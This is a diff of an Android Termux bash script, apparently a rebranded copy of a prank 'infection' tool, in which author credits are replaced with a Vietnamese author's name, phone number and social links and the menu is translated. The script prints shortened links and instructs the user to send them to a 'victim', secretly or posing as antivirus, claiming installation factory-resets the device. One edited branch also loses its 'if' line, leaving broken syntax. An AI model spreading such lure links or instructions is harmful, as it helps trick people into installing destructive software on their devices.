@@ -1,4 +1,4 @@
-# A tool by nitro from www.noob-hackers.com
+# Cần Mua Code Cho Riêng Mình Liên Hệ : 0834446837
 # Be a unique person not copy cat
 # Colours
 #-----------------
@@ -35,8 +35,8 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
                         Noob Hackers
 '
 echo " " 
-echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                       ▶Coded by nguyen tuan anh◀$rset"
+echo -e "$red                      ⫸$ylo  Tuan Anh Hackers$red ⫷$rset"
 echo 
 # Functions
 echo -e "$red                    [Infect them with fun]$rset"
@@ -64,10 +64,11 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
                   @#%,.@          @#%,.@            
                      @#%,.@      @#%,.@             
                        @#%.,@  @#%,.@              
-                        Noob Hackers
+                       TUAN ANH DEV
+                       Zalo 0834446837
 '
 echo " " 
-echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
+echo -e "$red                       ▶Coded by TUAN ANH$red◀$rset"
 echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
 echo 
 # Functions
@@ -79,14 +80,14 @@ menu(){
 echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
 echo " "
 echo " "
-echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
-echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
-echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
-echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
-echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
-echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
-echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
-echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Lây nhiễm ngay bây giờ"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Lưu bây giờ"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Về"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Cập nhật tập lệnh "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] ĐĂNG KÍ"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Hơn"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat(lỗi)"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Thoát"
 echo " "
 echo " "
 echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
@@ -107,17 +108,17 @@ then
 upd
 elif [ $optnz = "5" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://youtube.com/channel/UCaCRDnQvsVy_Xxbze6HrAlw > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "6" ];
 then
-am start -a android.intent.action.VIEW -d https://noob-hackers.github.io/noobspage > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://www.facebook.com/nguyen.tuan.anh.bat.tu.201 > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "7" ];
 then
-am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://www.facebook.com/nguyen.tuan.anh.bat.tu.201 > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "8" ];
@@ -138,17 +139,17 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m 😈  Copy below link and send it your victim and 
-say nothing to him. when he install it in his 
-device it will be factory reset and lot more happens.
+echo -e "\e[91m 😈  Sao chép liên kết dưới đây và gửi nó cho nạn nhân của bạn và
+ không nói gì với anh ta.  khi anh ấy cài đặt nó trong
+ thiết bị sẽ được khôi phục cài đặt gốc và nhiều hơn thế nữa sẽ xảy ra."
                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
 
                                  👆👆👆
-Use only for fun purpose not for harming someone 😇✌️.
-And our channel is not responsible for any kind of loss 
-you do to other's by this script."
+Chỉ sử dụng cho mục đích vui vẻ, không làm hại ai đó 😇✌️.
+ Và kênh của chúng tôi không chịu trách nhiệm cho bất kỳ hình thức mất mát nào
+ bạn làm với người khác bằng kịch bản này. "
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -169,19 +170,19 @@ echo -e '\e[92m
                    ( \( )(  _  )(_  _)( ___)
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
-echo " "
-echo " "
-echo -e "\e[93m  Copy below link and send it your victim and tell him
-that he should install this application or else his 
-device will not be recovered.(Antivirus)
+echo " tuananh.dev"
+echo "Zalo 0834446837"
+echo -e "\e[93m  Sao chép liên kết dưới đây và gửi nó cho nạn nhân của bạn và
+ không nói gì với anh ta.  khi anh ấy cài đặt nó trong
+ thiết bị sẽ được khôi phục cài đặt gốc và nhiều hơn thế nữa sẽ xảy ra."
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-Use only for fun purpose not for harming someone 😇✌️. 
-And our channel is not responsible for any kind of 
-loss you do to other's by this script."
+Chỉ sử dụng cho mục đích vui vẻ, không làm hại ai đó 😇✌️.
+ Và kênh của chúng tôi không chịu trách nhiệm cho bất kỳ hình thức mất mát nào
+ bạn làm với người khác bằng kịch bản này."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -273,9 +274,9 @@ echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m
 echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
 echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
 read p
-if [ "$p" = "y" ];
+
 then
-am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+am start -a android.intent.action.VIEW -d https://www.facebook.com/nguyen.tuan.anh.bat.tu.201 2>/dev/null
 clear
 baner1
 menu
